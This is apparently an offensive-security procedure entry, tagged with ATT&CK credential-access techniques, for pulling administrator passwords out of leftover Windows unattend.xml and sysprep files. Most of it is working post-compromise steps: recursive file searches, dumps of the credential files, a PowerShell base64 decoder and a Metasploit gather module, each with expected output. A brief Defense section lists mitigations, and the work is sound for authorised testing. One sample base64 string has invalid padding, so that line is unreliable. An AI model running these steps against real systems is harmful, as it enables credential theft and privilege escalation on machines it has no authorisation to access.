---
id: 3151fe9c-208d-47bd-b244-9594fb802fb4
name: windows-unattend-password-extraction
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:29.087769+00:00'
updated_at: '2023-04-10T20:37:39.314637+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
  - '[[techniques/Credentials in Files|T1081 - Credentials in Files]]'
sub_techniques: []
tags:
  - '[[tags/EoP - Looting for passwords]]'
  - '[[tags/Passwords in unattend.xml]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/windows-cmd-search-unattend-files]]'
  - '[[commands/powershell-decode-base64-password]]'
  - '[[commands/metasploit-post-enum-unattend]]'
platforms:
  - Windows
tools: []
validated: true
---

# windows-unattend-password-extraction

## Summary

This procedure details the process of locating Unattend.xml and related sysprep files on a Windows system to extract embedded credentials, such as base64-encoded passwords, for potential privilege escalation or lateral movement. These files, used for automated Windows installations, often retain sensitive information if not properly cleaned up post-deployment.

## Description

Unattend.xml files automate Windows setup by storing configuration details, including user accounts and passwords, which may be in plaintext or base64-encoded form. Attackers with file system access can search common locations like the Panther directory or sysprep folders to find these files, inspect them for <Password> or <AutoLogon> sections, and decode any encoded credentials. This technique is particularly effective in environments with legacy deployments or misconfigured imaging processes, allowing low-privilege users to obtain administrator passwords. The procedure assumes local access via a shell and focuses on manual and automated extraction methods.

## Requirements

1. Local shell access on the target Windows system (e.g., via compromised user account).
2. Ability to execute CMD or PowerShell commands (no elevated privileges needed if files are world-readable).
3. Optional: Active Meterpreter session for Metasploit integration.
4. Text editor or viewer to inspect XML/INF files (e.g., notepad).

## Defense

- Automatically remove or shred unattend.xml and sysprep files after deployment using scripts or deployment tools.
- Use Windows System Image Manager (SIM) to encrypt credentials in answer files with proper keys.
- Apply strict NTFS permissions to deployment directories like C:\Windows\Panther, limiting read access to administrators.
- Enable file integrity monitoring (e.g., via Sysmon or EDR) on sensitive paths to detect unauthorized access.
- Audit Windows installation logs for remnants of automation files.

## Objectives

1. Locate potential unattend and sysprep files containing credentials.
2. Extract and decode any embedded passwords from these files.
3. Validate extracted credentials for use in privilege escalation or further access.

## Instructions

### Step 1: Identify Common Unattend File Paths

**Context**: Start by checking standard locations where unattend files are typically stored post-installation. These paths are hardcoded in Windows deployment processes and often contain residual configuration data.

Manually verify the existence of files at these locations using `dir` or `if exist` in CMD:

```cmd
dir C:\unattend.xml
 dir C:\Windows\Panther\unattend.xml
 dir C:\Windows\Panther\Unattend\unattend.xml
 dir C:\Windows\system32\sysprep.inf
 dir C:\Windows\system32\sysprep\sysprep.xml
```

If a file exists, proceed to inspect it with `type` or notepad:

```cmd
type C:\Windows\Panther\unattend.xml
```

Look for sections like <AutoLogon> or <UserAccounts> containing <Password> tags.

**Expected Output**: Confirmation of file existence and XML content displaying potential credentials (e.g., base64 strings in <Password>).

### Step 2: Recursively Search for Answer Files

**Context**: If manual checks fail, perform a system-wide search for unattend and sysprep files, as they may be in non-standard locations due to custom deployments.

**Command** ([[commands/windows-cmd-search-unattend-files]]):

```cmd
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

> This command recursively searches the entire drive (starting from current directory, typically C:) for files matching common answer file patterns, suppressing errors for inaccessible directories. Run from C:\ for full coverage.

**Expected Output**: A list of discovered file paths, such as:

```
C:\Windows\Panther\unattend.xml
C:\Windows\system32\sysprep\sysprep.xml
```

### Step 3: Inspect Discovered Files for Credentials

**Context**: Once files are located, examine their contents for sensitive data like usernames and passwords, which are often in XML <LocalAccount> or <AutoLogon> elements.

Use CMD to dump the file content:

```cmd
type "path\to\unattend.xml"
```

Or open in notepad for better readability. Search for keywords like "Password", "Username", or base64-like strings (e.g., ending in ==).

If credentials are found in plaintext, note them directly. If encoded (base64), proceed to decoding.

**Expected Output**: XML snippets revealing credentials, e.g., <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>.

### Step 4: Decode Base64-Encoded Passwords

**Context**: Windows unattend files often store passwords in base64 to obfuscate them, but this is easily reversible. Use PowerShell for native decoding without external tools.

**Command** ([[commands/powershell-decode-base64-password]]):

```powershell
$encoded = "$_ENCODED"; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
```

> Replace $_ENCODED with the actual base64 string from the file (e.g., "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="). This converts the base64 to UTF8 plaintext.

**Expected Output**: The decoded password, e.g., SecretSecurePassword1234*.

### Step 5: Automate with Metasploit (Optional, if Session Available)

**Context**: For efficiency in a compromised environment, use Metasploit's post-exploitation module to automatically enumerate and parse unattend files, extracting credentials without manual inspection.

**Command** ([[commands/metasploit-post-enum-unattend]]):

In msfconsole:

```ruby
use post/windows/gather/enum_unattend
set SESSION $_SESSION_ID
run
```

> This module scans common paths, parses XML/INF files, and reports any found credentials. Requires an active Meterpreter session on the target.

**Expected Output**: Module output like:

```
[*] Enumerating Unattend files...
[+] Found unattend.xml at C:\Windows\Panther\unattend.xml
[+] Extracted password: SecretSecurePassword1234*
```

If no credentials are found, the module will report none detected.
